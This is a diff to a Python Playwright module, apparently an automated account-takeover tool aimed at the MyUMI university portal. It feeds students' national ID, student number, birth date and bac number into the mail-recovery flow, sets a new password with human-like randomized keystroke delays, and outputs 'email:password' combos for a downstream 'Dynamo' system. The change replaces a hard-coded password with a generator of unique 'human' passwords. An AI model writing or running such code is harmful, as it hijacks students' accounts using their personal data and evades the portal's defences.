@@ -1,12 +1,13 @@
 """
-UMI RECUPMAIL ENGINE — Core verification module for MyUMI portal
-Complete & Clean flow with Fast JS Input Scan -> Type fixed password -> 
-Click SEND -> Success Popup -> LOGIN_OK.
+UMI RECUPMAIL ENGINE — Core verification module for MyUMI portal with Dynamic Password Manager
+Complete & Clean flow with Fast JS Input Scan -> Type dynamic human password (PassManager) -> 
+Click SEND -> Success Popup -> LOGIN_OK with Email:Password format.
 """
 
 import re
 import time
 import random
+from integrations.pass_manager import PassManager
 
 class LoginState:
     LOGIN_OK = "login_ok"
@@ -14,18 +15,15 @@ class LoginState:
 
 class UMIEngine:
     def __init__(self):
-        pass
+        # ربط مباشر مع مدير الباسوردات لتوليد كلمات مرور بشرية وفريدة بدون تكرار
+        self.pass_manager = PassManager()
 
     def run_workflow(self, page, arg1, arg2, arg3="", arg4=""):
+        # استقبال البيانات مباشرة وبدون لخبطة طبقاً لـ edu_checker.py
         cne = str(arg1).strip()
         cin = str(arg2).strip()
         dob = str(arg3).strip()
         bac = str(arg4).strip()
-        
-        if "/" in str(arg2) or len(str(arg2)) == 8:
-            cin = str(arg3).strip()
-            dob = str(arg2).strip()
-            bac = str(arg4).strip()
 
         result_data = {
             "cne": cne,
@@ -34,8 +32,6 @@ class UMIEngine:
             "extracted_email": None,
             "detail": "Initialized"
         }
-
-        fixed_password = "8eZ@R6a*t=/.FJa"
 
         try:
             # 1. Page stable check
@@ -177,7 +173,7 @@ class UMIEngine:
                 except Exception:
                     pass
 
-            # 6. --- الفحص السوري الفوري للأخطاء الحمراء فور الضغط على NEXT ---
+            # 6. --- الفحص السريع للأخطاء الحمراء فور الضغط على NEXT ---
             page.wait_for_timeout(2000)
             body_text = page.locator("body").inner_text()
             low_text = body_text.lower()
@@ -230,13 +226,16 @@ class UMIEngine:
                     result_data["detail"] = "Failed: JS Direct Email extraction failed (Login Error)"
                     return result_data
 
-                # --- إدخال الباسورد الثابت ---
+                # --- توليد باسورد جديد، طبيعي، وفريد تماماً عبر PassManager ---
+                target_password = self.pass_manager.get_password()
+
+                # --- إدخال الباسورد الجديد ---
                 try:
                     pass_input = password_field.first
                     pass_input.click()
                     page.wait_for_timeout(300)
                     pass_input.fill("")
-                    for char in fixed_password:
+                    for char in target_password:
                         pass_input.press_sequentially(char, delay=random.randint(100, 200))
                     page.wait_for_timeout(800)
                 except Exception:
@@ -284,11 +283,11 @@ class UMIEngine:
                 except Exception:
                     pass
 
-                # --- إرسال النتيجة للدينامو ---
-                final_combo = f"{extracted_email}:{fixed_password}"
+                # --- إرسال النتيجة بالصيغة المطلوبة مباشرة Email:Password للـ Dynamo ---
+                final_combo = f"{extracted_email}:{target_password}"
                 result_data["status"] = LoginState.LOGIN_OK
                 result_data["extracted_email"] = final_combo
-                result_data["detail"] = f"Success | {final_combo}"
+                result_data["detail"] = final_combo
                 return result_data
 
             result_data["status"] = LoginState.LOGIN_ERROR
